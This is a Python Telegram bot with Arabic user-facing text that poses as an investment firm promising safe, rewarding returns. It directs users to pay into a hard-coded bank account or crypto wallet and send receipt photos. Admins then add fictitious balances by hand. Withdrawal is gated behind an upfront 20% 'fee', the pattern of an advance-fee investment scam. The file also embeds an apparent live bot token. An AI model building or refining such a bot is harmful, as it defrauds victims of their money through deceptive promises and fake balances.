import logging, os, sqlite3
from flask import Flask
from threading import Thread
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- 🌐 خادم الويب (لضمان استقرار السيرفر على Render) ---
app_web = Flask('')
@app_web.route('/')
def home(): return "🚀 Sahm Platform - High Performance Version"

def run_server():
    app_web.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))

# إعداد السجلات
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# ================= [ ⚙️ إعدادات الإمبراطور ] =================
TOKEN = '8731999916:AAHdeigVSmil8KD6GeA7OazVZkjVxhq9QJU'
ADMIN_USERNAME = 'HCICICVICIF9'
ADMINS_LIST = [6016547718]

# 🏦 عناوين الدفع
BANK_ACCOUNT = "SA0000000000000000000000"
CRYPTO_WALLET = "TLtLuhkU2kkkR1Wz1TtrBTpoNRTNviYpsA"

# ===============================================================

# --- 🗄️ إدارة قاعدة البيانات المحلية ---
def init_db():
    conn = sqlite3.connect('sahm_v4_stable.db', check_same_thread=False)
    conn.execute('''CREATE TABLE IF NOT EXISTS users (
                    uid INTEGER PRIMARY KEY, 
                    bal_sar REAL DEFAULT 0.0, 
                    bal_usd REAL DEFAULT 0.0)''')
    conn.commit()
    return conn

db_conn = init_db()

def get_user_data(uid):
    cursor = db_conn.cursor()
    cursor.execute('SELECT bal_sar, bal_usd FROM users WHERE uid = ?', (uid,))
    row = cursor.fetchone()
    if not row:
        cursor.execute('INSERT INTO users (uid, bal_sar, bal_usd) VALUES (?, 0.0, 0.0)', (uid,))
        db_conn.commit()
        return {"bal_sar": 0.0, "bal_usd": 0.0}
    return {"bal_sar": row[0], "bal_usd": row[1]}

def update_balance(uid, curr, amt):
    cursor = db_conn.cursor()
    field = "bal_sar" if curr == 'sr' else "bal_usd"
    cursor.execute(f'UPDATE users SET {field} = {field} + ? WHERE uid = ?', (float(amt), int(uid)))
    db_conn.commit()

# --- 🏠 الترحيب القوي ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    get_user_data(user.id)
    kb = [
        [InlineKeyboardButton("🇸🇦 استثمار (بالريال السعودي)", callback_data='c_sr'),
         InlineKeyboardButton("🇺🇸 استثمار (بالدولار)", callback_data='c_us')],
        [InlineKeyboardButton("🌍 الاستثمار بعملات أخرى", callback_data='other_currency')],
        [InlineKeyboardButton("💰 محفظتي المالية", callback_data='wallet')],
        [InlineKeyboardButton("📤 طلب سحب الأرباح", callback_data='withdraw')],
        [InlineKeyboardButton("💬 التواصل مع الإدارة", url=f"https://t.me/{ADMIN_USERNAME}")]
    ]
    welcome_text = (
        f"🏦 **مرحباً بكم في شركة الاولى العالميه للاستثمار**\n\n"
        f"السيد: **{user.first_name}**\n\n"
        f"أهلاً بك في منصتنا الرائدة. نحن هنا لنصنع مستقبلك المالي بأمان تام وعوائد مجزية.\n\n"
        f"💡 **يرجى اختيار القسم المطلوب للبدء:**"
    )
    if update.message: await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    else: await update.callback_query.edit_message_text(welcome_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

# --- 🔘 معالج الأزرار المطور ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data, uid = query.data, query.from_user.id
    await query.answer()

    if data == 'main': await start(update, context)
    
    elif data == 'other_currency':
        await query.edit_message_text("🌍 **الاستثمار بالعملات الدولية:**\n\nيرجى التواصل مع الدعم الفني للحصول على حساباتنا البنكية الرسمية المتاحة في أي دولة حول العالم.", 
                                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')

    elif data == 'wallet':
        u = get_user_data(uid)
        await query.edit_message_text(f"📊 **محفظتك المالية:**\n\n🇸🇦 ريال: `{u['bal_sar']:,}`\n🇺🇸 دولار: `{u['bal_usd']:,}`", 
                                     reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')
    
    elif data == 'withdraw':
        u = get_user_data(uid)
        sar_fee = u['bal_sar'] * 0.20
        usd_fee = u['bal_usd'] * 0.20
        msg = (f"📤 **إجراءات سحب الأرباح:**\n\n"
               f"💰 **رصيدك الحالي:**\n"
               f"🇸🇦: `{u['bal_sar']:,}` ﷼\n"
               f"🇺🇸: `{u['bal_usd']:,}` $\n\n"
               f"⚠️ **الرسوم المتوجبة لفتح بوابة السحب (20%):**\n"
               f"🇸🇦 المطلوب سداده: **`{sar_fee:,}` ريال**\n"
               f"🇺🇸 المطلوب سداده: **`{usd_fee:,}` دولار**\n\n"
               f"يرجى دفع الرسوم للإدارة ليتم تفعيل السحب الفوري.")
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data='main')]]), parse_mode='Markdown')

    elif data in ['c_sr', 'c_us']:
        curr = 'sr' if data == 'c_sr' else 'us'
        prices = ["1000", "5000", "10000", "20000", "50000"] if curr == 'sr' else ["300", "500", "1000", "5000", "10000"]
        btns = [[InlineKeyboardButton(f"{p} {('﷼' if curr=='sr' else '$')}", callback_data=f"{curr[0]}_{p}") for p in prices[i:i+2]] for i in range(0, len(prices), 2)]
        btns.append([InlineKeyboardButton("🔙 رجوع", callback_data='main')])
        await query.edit_message_text("🏦 **يرجى اختيار مبلغ الاستثمار:**", reply_markup=InlineKeyboardMarkup(btns), parse_mode='Markdown')

    elif data.startswith(('s_', 'u_')):
        amt = data.split('_')[1]
        addr = BANK_ACCOUNT if data.startswith('s_') else CRYPTO_WALLET
        await query.edit_message_text(f"✅ اخترت مبلغ: **{amt}**\n\nحول إلى:\n`{addr}`\n\n📸 أرسل صورة الإيصال هنا.", parse_mode='Markdown')

    elif data.startswith('ok_'): # أزرار المالك الثابتة
        if uid not in ADMINS_LIST: return
        _, cur, val, tid = data.split('_')
        update_balance(tid, cur, val)
        await query.answer(f"✅ تم إضافة {val} بنجاح", show_alert=False)
        try: await context.bot.send_message(int(tid), f"🎉 **أبشر.. تم إيداع `{val}` {('﷼' if cur=='sr' else '$')} في محفظتك!**", parse_mode='Markdown')
        except: pass

    elif data == 'delete_msg':
        if uid in ADMINS_LIST: await query.message.delete()

# --- 📸 معالج الصور ---
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text("✅ **استلمنا الإيصال، جاري المراجعة...**", parse_mode='Markdown')
    def b(v, c): return InlineKeyboardButton(f"➕ {v} {('ر' if c=='sr' else '$')}", callback_data=f"ok_{c}_{v}_{user.id}")
    kb = [[b("1000", "sr"), b("5000", "sr"), b("10000", "sr")], [b("100", "us"), b("500", "us"), b("1000", "us")], [InlineKeyboardButton("❌ إغلاق", callback_data='delete_msg')]]
    for adm in ADMINS_LIST:
        try: await context.bot.send_photo(adm, update.message.photo[-1].file_id, caption=f"🔔 إيداع من: {user.first_name}\nID: `{user.id}`", reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
        except: pass

if __name__ == '__main__':
    Thread(target=run_server, daemon=True).start()
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler('start', start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.run_polling(drop_pending_updates=True)
